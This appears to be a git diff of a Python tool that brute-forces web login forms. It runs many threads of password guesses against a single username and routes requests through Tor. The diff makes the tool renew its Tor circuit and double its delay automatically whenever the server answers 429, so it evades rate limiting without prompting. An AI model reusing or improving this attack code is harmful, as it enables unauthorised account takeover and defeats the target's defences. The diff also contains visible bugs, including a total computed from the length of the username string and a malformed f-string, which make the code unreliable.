@@ -1,8 +1,9 @@
-from .request import request, Tor, test_ip
-from .loggin import log
-from .lists import read_header_file, read_wordlist, make_question
-from .response import check_response
-from .database import db
+import sys
+from src.utils.request import request, Tor, test_ip
+from src.utils.loggin import log
+from src.utils.lists import read_header_file, read_wordlist, make_question
+from src.utils.response import check_response
+from src.utils.database import db
 from math import ceil
 from time import sleep, time
 from threading import Thread
@@ -10,8 +11,8 @@ from subprocess import Popen, PIPE
 
 class Threads:
     methods = ["GET", "POST", "PUT", "OPTIONS"]
-    def __init__(self, path_username, path_password, target=None):
-        self.path_username = path_username
+    def __init__(self, username, path_password, target=None):
+        self.username = username
         self.path_password = path_password
 
         self.control_port = 9051
@@ -78,14 +79,13 @@ class Threads:
         log.info(f"Loaded Request Body: {datas}", extra={"bold": True})
         log.info(f"Data payload 'data' is '{self.data}'", extra={"bold": True})
 
-        self.usernames = read_wordlist(self.path_username)
         self.passwords = read_wordlist(self.path_password)
-        self.total = len(self.passwords) * len(self.usernames)
+        self.total = len(self.passwords) * len(self.username)
 
-        if not self.usernames or not self.passwords:
-            return log.critical(f"Password(s) is null or Username is null ({self.usernames},{self.passwords})")
+        if not self.username or not self.passwords:
+            return log.critical(f"Password(s) is null or Username is null ({self.username},{self.passwords})")
 
-        log.info(f"The Wordlist(s) was loaded with successfully\n - Password(s): {len(self.passwords)}\n - Username(s): {len(self.usernames)}", extra={"bold": True})
+        log.info(f"The Wordlist(s) was loaded with successfully\n - Password(s): {len(self.passwords)}\n - Username(s): 1", extra={"bold": True})
 
         self.passwords_grouped = self.__group__(self.passwords)
 
@@ -113,53 +113,42 @@ class Threads:
             return True
         return False
 
-    def __send__(self, username, password, id):
+    def __send__(self, password, id):
         try:
             res = request(method=self.method,
                           url=self.url,
-                          data=self.data.replace("^USER^", username)
+                          data=self.data.replace("^USER^", self.username)
                           .replace("^PASS^", password)
                           .replace("^TMSTMP^", str(time() * 1000)),
                           headers=self.headers
                           )
             if res.status_code == 429:
-                log.warn("It seems you got 429 (Too Many Requests).", extra={"bold": True})
-                yn = log.input("Do you want to increase the Timeout and create a new Tor Circuit? [Y/n]")
-                if "y" in yn:
-                    if self.timeout == 0:
-                        self.timeout += 1
-                    self.timeout*=2
-                    log.info(f"Now the new timeout is {self.timeout}")
-                    self.tor.renew_circuit()
-                    test_ip()
-                    self.__send__(username, password, id)
-                else:
-                    return log.critical("The request got 429 (Too many requests)")
+                log.debug("It seems you got 429 (Too Many Requests).")
+                if self.timeout == 0:
+                    self.timeout += 1
+                self.timeout*=2
+                log.debug(f"Now the new timeout is {self.timeout}")
+                self.tor.renew_circuit()
+                self.__send__(password, id)
+            sys.stdout.write(f'\033[2K\rTried {self.attempts} of {self.total} passwords. [\033[38;2;255;0;111m#{id}\033[0m \033[35m{self.username}\033[0m|\033[35m{password}\033[0m => \033[38;5;214m{res.status_code}\033[0m]\r')
+            sys.stdout.flush()
             had_success = self.__check__(res)
-            log.attempt(self.attempts,
-                         self.total,
-                         username,
-                         password,
-                         res.status_code
-                         , had_success=had_success, id=id)
-            self.attempts+=1
             if had_success:
+                sys.stdout.write(f'\033[2K\n[\033[0;32m+\033[0m] Password found: {password} ({self.attempts}) [#{id} {res.status_code}]\n')
+                sys.stdout.flush()
                 return True
-        except (ConnectionError, ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError):
-            log.reattempt(self.attempts, self.total, username, password, id)
-            self.__send__(username, password, id)
+            self.attempts+=1
+        except Exception as e:
+            sys.stdout.write(f"\033[2K\n[\033[0;36mRE-ATTEMPT\033[0m] (\033[0;31m{e.args[0].split("(")[0].split(' '[0] if '(' in e.args[0] else e.__class__.__name__)}\033[0m => \033[0;95m{e.__cause__}\033[0m) {str(e).split(':')[-1].strip()}\n")
+            sys.stdout.flush()
+            self.__send__(password, id)
 
     def __loop__(self, id):
-        break_loop = False
-        for i, u in enumerate(self.usernames):
-            for i_, p in enumerate(self.passwords_grouped[id]):
-                b = self.__send__(u, p, id)
-                if b:
-                    break_loop = True
-                    break
-                sleep(self.timeout)
-            if break_loop:
+        for i_, p in enumerate(self.passwords_grouped[id]):
+            b = self.__send__(p, id)
+            if b:
                 break
+            sleep(self.timeout)
 
     def run_attack(self):
         for i in range(self.num_threads):
@@ -169,6 +158,6 @@ class Threads:
         for i, t in enumerate(self.threads):
             t.start()
             log.debug(f"The thread {i} was created and started", extra={"bold": True})
-
+        print("\n")
         for t in self.threads:
             t.join()
